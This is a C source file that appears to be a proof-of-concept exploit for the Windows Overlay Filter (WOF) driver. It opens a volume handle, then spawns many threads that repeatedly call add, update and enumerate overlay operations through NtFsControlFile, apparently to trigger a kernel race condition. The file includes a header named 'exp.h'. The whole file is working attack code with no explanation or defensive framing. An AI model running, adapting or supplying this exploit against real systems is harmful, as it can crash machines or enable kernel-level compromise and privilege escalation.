#include <Windows.h>
#include <stdio.h>

#include "exp.h"

static _NtFsControlFile NtFsControlFile = NULL;

int main(void)
{
    HANDLE   hVolume = INVALID_HANDLE_VALUE, hAddEnumThread = NULL;
    HANDLE   hEnumThread1 = NULL, hEnumThread2 = NULL;
    HANDLE   hUpdateLoopThread1 = NULL;
    CTX      ctx = { hVolume, INITIAL_PATH };
    HANDLE   t;

    log("Resolving Symbols");
    if (!ResolveSymbols())
        goto out;
    log("Symbols Resolved");

    log("Acquiring Handle");
    hVolume = CreateFileW(
        EXP_VOL,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hVolume == INVALID_HANDLE_VALUE) {
        err("main::CreateFileW", GetLastError());
        goto out;
    }
    log("Handle Acquired");

    CreateThread(NULL, 0, &AddThread, &ctx, 0, NULL);

    for (int i = 0; i < 0x10; i++) {
        t = CreateThread(NULL, 0, &UpdateLoopThread, &ctx, 0, NULL);
        CreateThread(NULL, 0, &EnumThread, &ctx, 0, NULL);
    }

    WaitForSingleObject(t, INFINITE);

out:
    if (hVolume != INVALID_HANDLE_VALUE)
        CloseHandle(hVolume);

    return 0;
}

static BOOL ResolveSymbols(void)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    NtFsControlFile = (_NtFsControlFile)GetProcAddress(hNtdll, "NtFsControlFile");

    if (!NtFsControlFile) {
        err("ResolveSymbols::GetProcAddress", GetLastError());
        return FALSE;
    }

    return TRUE;
}

static NTSTATUS EnumOverlay(HANDLE hVolume, WIM_PROVIDER_OVERLAY_ENTRY *outBuf, ULONG outSize)
{
    IO_STATUS_BLOCK                 isb = { 0 };
    WOF_EXTERNAL_INFO               info = { 0 };
    NTSTATUS                        status;

    info.Provider = WOF_CURRENT_VERSION;
    info.Version = WOF_PROVIDER_WIM;

    status = NtFsControlFile(
        hVolume, 
        NULL, 
        NULL, 
        NULL, 
        &isb, 
        FSCTL_ENUM_OVERLAY, 
        &info, 
        sizeof(WOF_EXTERNAL_INFO), 
        outBuf, 
        outSize
    );

    // printf("[+] EnumOverlay Status: 0x%08X\n", status);
    return status;
}

static NTSTATUS AddOverlay(HANDLE hVolume, LPCWSTR wimPath, PLARGE_INTEGER dataSrc)
{
    IO_STATUS_BLOCK                 isb = { 0 };
    WOF_EXTERNAL_INFO               *info = NULL;
    WIM_PROVIDER_ADD_OVERLAY_INPUT  *overlayInput = NULL;
    NTSTATUS                        status;
    SIZE_T                          inputSize = 0;
    WCHAR                           *fileName = NULL;

    inputSize = sizeof(WOF_EXTERNAL_INFO) + \
        sizeof(WIM_PROVIDER_ADD_OVERLAY_INPUT) + (wcslen(wimPath) + 1) * 2;

    info = zalloc(inputSize);
    if (!info) {
        err("AddOverlay::HeapAlloc", GetLastError());
        return STATUS_HEAP_CORRUPTION; // fuck it
    }
    overlayInput = (WIM_PROVIDER_ADD_OVERLAY_INPUT *)((ULONG_PTR)info + sizeof(WOF_EXTERNAL_INFO));
    fileName = (WCHAR *)((ULONG_PTR)overlayInput + sizeof(WIM_PROVIDER_ADD_OVERLAY_INPUT));

    info->Version = WOF_CURRENT_VERSION;
    info->Provider = WOF_PROVIDER_WIM;

    overlayInput->WimType = WIM_BOOT_NOT_OS_WIM;
    overlayInput->WimIndex = 0x1;
    overlayInput->WimFileNameOffset = sizeof(WIM_PROVIDER_ADD_OVERLAY_INPUT);
    overlayInput->WimFileNameLength = wcslen(wimPath) * 2;

    wcscpy_s(fileName, wcslen(wimPath) + 1, wimPath);

    status = NtFsControlFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &isb,
        FSCTL_ADD_OVERLAY,
        info,
        inputSize,
        dataSrc,
        sizeof(LARGE_INTEGER)
    );
    if (!NT_SUCCESS(status))
        err("AddOverlay::NtFsControlFile", status);

    zfree(info);

    printf("[+] AddOverlay Status 0x%08X\n", status);
    return status;
}

static NTSTATUS RemoveOverlay(HANDLE hVolume, ULONG64 dataSrcId)
{
    NTSTATUS                            status;
    IO_STATUS_BLOCK                     isb;
    WOF_EXTERNAL_INFO                   *info = NULL;
    WIM_PROVIDER_REMOVE_OVERLAY_INPUT   *overlayInput = NULL;
    SIZE_T                              inputSize = 0;

    inputSize = sizeof(WOF_EXTERNAL_INFO) + sizeof(PWIM_PROVIDER_REMOVE_OVERLAY_INPUT);
    
    info = zalloc(inputSize);
    if (!info) {
        err("RemoveOverlay::HeapAlloc", GetLastError());
        return STATUS_HEAP_CORRUPTION;
    }
    overlayInput = (WIM_PROVIDER_REMOVE_OVERLAY_INPUT *)((ULONG_PTR)info + sizeof(WOF_EXTERNAL_INFO));

    info->Provider = WOF_PROVIDER_WIM;
    info->Version = WOF_CURRENT_VERSION;

    overlayInput->DataSourceId.QuadPart = dataSrcId;

    status = NtFsControlFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &isb,
        FSCTL_REMOVE_OVERLAY,
        info,
        inputSize,
        NULL,
        0
    );

    // printf("[+] RemoveOverlay Status 0x%08X\n", status);
    zfree(info);
    return status;
}

static NTSTATUS DismountVolume(HANDLE hVolume)
{
    IO_STATUS_BLOCK                 isb = { 0 };
    NTSTATUS                        status;

    status = NtFsControlFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &isb,
        FSCTL_DISMOUNT_VOLUME,
        NULL,
        0,
        NULL,
        0
    );

    printf("[+] DismountVolume Status: 0x%08X\n", status);
    return status;
}

static NTSTATUS UpdateOverlay(HANDLE hVolume, ULONG64 dataSrcId, LPCSTR wimPath)
{
    NTSTATUS                            status;
    IO_STATUS_BLOCK                     isb;
    WOF_EXTERNAL_INFO                   *info = NULL;
    WIM_PROVIDER_UPDATE_OVERLAY_INPUT   *overlayInput = NULL;
    SIZE_T                              inputSize = 0;
    WCHAR                               *fileName = NULL;

    inputSize = sizeof(WOF_EXTERNAL_INFO) + \
        sizeof(WIM_PROVIDER_UPDATE_OVERLAY_INPUT) + (wcslen(wimPath) + 1) * 2;

    info = zalloc(inputSize);
    if (!info) {
        err("RemoveOverlay::HeapAlloc", GetLastError());
        return STATUS_HEAP_CORRUPTION;
    }
    overlayInput = (WIM_PROVIDER_UPDATE_OVERLAY_INPUT *)((ULONG_PTR)info + sizeof(WOF_EXTERNAL_INFO));
    fileName = (WCHAR *)((ULONG_PTR)overlayInput + sizeof(WIM_PROVIDER_UPDATE_OVERLAY_INPUT));

    info->Provider = WOF_PROVIDER_WIM;
    info->Version = WOF_CURRENT_VERSION;

    overlayInput->DataSourceId.QuadPart = dataSrcId;
    overlayInput->WimFileNameOffset = sizeof(WIM_PROVIDER_UPDATE_OVERLAY_INPUT);
    overlayInput->WimFileNameLength = wcslen(wimPath) * 2;

    wcscpy_s(fileName, wcslen(wimPath) + 1, wimPath);

    status = NtFsControlFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &isb,
        FSCTL_UPDATE_OVERLAY,
        info,
        inputSize,
        NULL,
        0
    );

    // printf("[+] UpdateOverlay Status 0x%08X\n", status);
    zfree(info);
    return status;
}

static void EnumThread(PVOID ctx)
{
    PCTX                            Ctx = (PCTX)ctx;
    IO_STATUS_BLOCK                 isb = { 0 };
    WOF_EXTERNAL_INFO               info = { 0 };
    NTSTATUS                        status;
    char                            buf[2000];

    info.Provider = WOF_CURRENT_VERSION;
    info.Version = WOF_PROVIDER_WIM;

    while (1) {
        RtlZeroMemory(&buf, sizeof(buf));
        status = NtFsControlFile(
            Ctx->volume,
            NULL,
            NULL,
            NULL,
            &isb,
            FSCTL_ENUM_OVERLAY,
            &info,
            sizeof(WOF_EXTERNAL_INFO),
            &buf,
            sizeof(buf)
        );
        if (!NT_SUCCESS(status)) {
            puts("CRITICAL ERROR!");
            printf("0x%08X\n", status);
        }
    }
    // printf("[+] EnumOverlay Status: 0x%08X\n", status);
    return;
}

static void AddThread(PVOID ctx)
{
    LARGE_INTEGER               dataSrc = { 0 };

    AddOverlay(((CTX *)ctx)->volume, ((CTX*)ctx)->path, &dataSrc);

    return;
}

static void UpdateLoopThread(PVOID ctx)
{
    PCTX                                Ctx = (PCTX)ctx;
    NTSTATUS                            status;
    IO_STATUS_BLOCK                     isb;
    WOF_EXTERNAL_INFO                   *info = NULL;
    WIM_PROVIDER_UPDATE_OVERLAY_INPUT   *overlayInput = NULL;
    SIZE_T                              inputSize = 0;
    WCHAR                               *fileName = NULL;

    inputSize = sizeof(WOF_EXTERNAL_INFO) + \
        sizeof(WIM_PROVIDER_UPDATE_OVERLAY_INPUT) + (wcslen(Ctx->path) + 1) * 2;

    info = zalloc(inputSize);
    if (!info) {
        err("RemoveOverlay::HeapAlloc", GetLastError());
        return STATUS_HEAP_CORRUPTION;
    }
    overlayInput = (WIM_PROVIDER_UPDATE_OVERLAY_INPUT*)((ULONG_PTR)info + sizeof(WOF_EXTERNAL_INFO));
    fileName = (WCHAR*)((ULONG_PTR)overlayInput + sizeof(WIM_PROVIDER_UPDATE_OVERLAY_INPUT));

    info->Provider = WOF_PROVIDER_WIM;
    info->Version = WOF_CURRENT_VERSION;

    overlayInput->DataSourceId.QuadPart = 0;
    overlayInput->WimFileNameOffset = sizeof(WIM_PROVIDER_UPDATE_OVERLAY_INPUT);
    overlayInput->WimFileNameLength = wcslen(Ctx->path) * 2;

    wcscpy_s(fileName, wcslen(Ctx->path) + 1, Ctx->path);
    while (1) {
        status = NtFsControlFile(
            Ctx->volume,
            NULL,
            NULL,
            NULL,
            &isb,
            FSCTL_UPDATE_OVERLAY,
            info,
            inputSize,
            NULL,
            0
        );
        if (!NT_SUCCESS(status)) {
            puts("CRITICAL ERROR!");
            printf("0x%08X\n", status);
        }
    }

    zfree(info);
    return;
}